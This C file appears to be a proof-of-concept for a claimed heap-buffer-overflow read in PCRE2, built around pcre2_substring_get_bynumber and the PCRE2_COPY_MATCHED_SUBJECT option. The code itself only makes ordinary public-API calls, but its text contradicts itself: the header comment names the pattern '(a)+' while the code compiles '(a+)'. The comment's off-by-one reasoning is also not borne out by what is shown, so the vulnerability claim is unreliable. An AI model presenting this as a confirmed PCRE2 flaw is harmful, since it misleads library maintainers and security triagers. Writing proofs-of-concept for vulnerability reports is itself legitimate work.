/* PoC: heap-buffer-overflow READ in pcre2_substring_get_bynumber when the
   match subject was captured with PCRE2_COPY_MATCHED_SUBJECT.

   Public API only, in-contract input:
     - compile  (a)+  -> one capturing group
     - match "aaaa" with PCRE2_COPY_MATCHED_SUBJECT (library copies the subject)
     - extract capture group 1 with pcre2_substring_get_bynumber

   The captured group spans the whole subject [0,4), so the extractor reads one
   code unit past the end of the library's copied-subject buffer. */

#include <stdio.h>
#include <string.h>
#define PCRE2_CODE_UNIT_WIDTH 8
#include <pcre2.h>

int main(void)
{
  int errcode;
  PCRE2_SIZE erroff;
  pcre2_code *code = pcre2_compile((PCRE2_SPTR)"(a+)", PCRE2_ZERO_TERMINATED,
                                   0, &errcode, &erroff, NULL);
  if (code == NULL) { fprintf(stderr, "compile failed\n"); return 2; }

  pcre2_match_data *md = pcre2_match_data_create_from_pattern(code, NULL);
  if (md == NULL) { fprintf(stderr, "md alloc failed\n"); return 2; }

  /* A subject with no trailing NUL in its own allocation is not required by the
     API, but here we simply let the library make its own copy. */
  PCRE2_SPTR subject = (PCRE2_SPTR)"aaaa";
  int rc = pcre2_match(code, subject, 4, 0, PCRE2_COPY_MATCHED_SUBJECT, md, NULL);
  if (rc < 0) { fprintf(stderr, "no match: %d\n", rc); return 2; }

  PCRE2_UCHAR *str = NULL;
  PCRE2_SIZE slen = 0;
  int grc = pcre2_substring_get_bynumber(md, 1, &str, &slen);
  if (grc == 0)
  {
    printf("group1 len=%lu str=%s\n", (unsigned long)slen, (char *)str);
    pcre2_substring_free(str);
  }
  else
    fprintf(stderr, "get_bynumber rc=%d\n", grc);

  pcre2_match_data_free(md);
  pcre2_code_free(code);
  return 0;
}
